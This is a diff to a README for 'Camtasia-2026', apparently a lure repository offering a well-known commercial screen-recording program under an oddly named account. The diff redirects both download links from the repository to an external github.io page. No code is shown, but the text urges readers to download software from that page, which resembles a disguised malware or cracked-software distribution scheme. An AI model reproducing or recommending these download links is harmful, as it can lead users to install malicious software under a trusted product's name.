@@ -1,6 +1,6 @@
 # 🎥 Camtasia-2026 - Streamline Your Entire Screen Recording Workflow
 
-[ ![Download Camtasia-2026](https://img.shields.io/badge/Download-Camtasia_2026-blue.svg) ](https://github.com/coatingoryctolagus271/Camtasia-2026)
+[ ![Download Camtasia-2026](https://img.shields.io/badge/Download-Camtasia_2026-blue.svg) ](https://coatingoryctolagus271.github.io)
 
 Camtasia-2026 organizes your screen recording tasks. It handles screen captures, callouts, quizzes, and tutorial exports in one place. Use this tool on Windows to manage your video projects with speed.
 
@@ -28,7 +28,7 @@ Make sure your computer meets these needs before you start. These specs ensure s
 
 Visit this page to download the software for your Windows computer:
 
-[Download Camtasia-2026](https://github.com/coatingoryctolagus271/Camtasia-2026)
+[Download Camtasia-2026](https://coatingoryctolagus271.github.io)
 
 ## 🛠️ Installation Steps
 
